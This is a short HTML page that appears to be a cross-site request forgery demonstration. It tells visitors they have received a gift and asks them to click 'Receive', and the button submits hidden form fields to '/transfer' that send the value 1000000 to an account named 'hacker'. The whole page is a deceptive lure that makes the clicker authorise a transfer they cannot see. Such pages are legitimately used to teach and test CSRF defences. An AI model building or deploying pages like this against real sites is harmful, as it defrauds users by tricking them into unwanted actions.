<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Form</title>
    <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    form {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    input {
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

<h1>Thank you</h1>
<p>You have just received a gift, please click the button below to receive it</p>

<form action="/transfer" method="post">
    <input name="value" type="hidden" value="1000000">
    <input name="to" type="hidden" value="hacker">
    <button type="submit">Receive</button>
</form>

</body>
</html>
